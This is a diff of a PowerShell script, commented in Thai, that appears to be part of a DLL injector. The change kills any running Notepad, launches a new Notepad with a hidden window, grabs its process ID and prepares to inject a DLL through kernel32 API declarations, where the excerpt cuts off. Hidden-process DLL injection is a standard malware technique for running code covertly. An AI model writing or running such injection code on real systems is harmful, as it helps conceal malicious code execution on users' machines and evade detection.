@@ -111,22 +111,20 @@ do {
                 }
             }
             
-            # โหมด INJECT (จะทำงานก็ต่อเมื่อมีไฟล์แล้ว หรือดาวน์โหลดเสร็จแล้วเท่านั้น)
+            # โหมด INJECT: เคลียร์ Notepad เก่าทิ้งก่อนทุกครั้ง เพื่อป้องกันการติดค้าง
+            Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+            Start-Sleep -Seconds 1
+
             Write-Host "`n[->] กำลังดำเนินการ Inject DLL..." -ForegroundColor Cyan
             
+            # เปิด Notepad แบบ Hidden ตัวใหม่สดๆ
+            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
+            $processStartInfo.FileName = "C:\Windows\System32\notepad.exe"
+            $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+            [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
+            
+            Start-Sleep -Seconds 2
             $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
-            if (-not $process) {
-                Write-Host "ไม่พบ Notepad กำลังเปิดโปรแกรมขึ้นมาแบบซ่อนหน้าต่าง..." -ForegroundColor Yellow
-                
-                # เปิด Notepad แบบ Hidden
-                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-                $processStartInfo.FileName = "C:\Windows\System32\notepad.exe"
-                $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-                [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
-                
-                Start-Sleep -Seconds 2
-                $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
-            }
 
             if (-not $process) {
                 Write-Host "[-] ไม่สามารถเปิดหรือดึง Process ของ Notepad ได้" -ForegroundColor Red
@@ -135,7 +133,6 @@ do {
             }
 
             Write-Host "[+] PID เป้าหมาย: $($process.Id)" -ForegroundColor Green
-
             # ประกาศ Win32 API
             $Signature = @"
 [DllImport("kernel32.dll", SetLastError = true)]
